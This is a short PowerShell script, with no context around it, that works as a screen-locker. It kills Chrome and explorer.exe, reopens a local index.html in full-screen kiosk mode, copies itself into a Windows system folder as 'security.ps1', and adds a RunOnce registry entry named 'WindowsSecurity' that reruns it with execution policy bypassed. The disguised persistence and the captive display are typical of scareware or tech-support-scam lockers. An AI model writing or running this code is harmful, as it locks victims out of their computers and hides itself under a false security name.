Stop-Process -Name 'chrome' -Force;
Start-Process 'taskkill.exe' -ArgumentList '-F -IM explorer.exe';

$fullPath = Resolve-Path .\index.html;
Start-Process 'chrome.exe' -ArgumentList "--kiosk $fullPath";

Copy-Item -Path "./script.ps1" -Destination "C:\Windows\tracing\security.ps1";

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "WindowsSecurity" /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -File C:\Windows\tracing\security.ps1" /f
